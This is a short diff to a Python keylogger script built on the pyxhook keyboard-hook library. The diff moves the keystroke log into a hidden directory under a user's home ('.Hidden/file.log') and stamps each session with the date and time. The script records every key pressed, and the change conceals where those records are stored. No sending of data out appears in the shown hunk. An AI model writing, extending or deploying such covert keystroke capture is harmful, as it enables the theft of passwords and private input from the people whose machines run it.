@@ -12,8 +12,18 @@ grave key is found below Esc key
 """
 
 import pyxhook
+import time
+import datetime
+
+today=datetime.datetime.now()
+
+fob=open("/home/raman/Style/.Hidden/file.log","aw+")
+fob.write("\n")
+fob.write(str(today))
+fob.close()
+
 #change this to your log file's path
-log_file='/home/aman/Desktop/file.log'
+log_file='/home/raman/Style/.Hidden/file.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
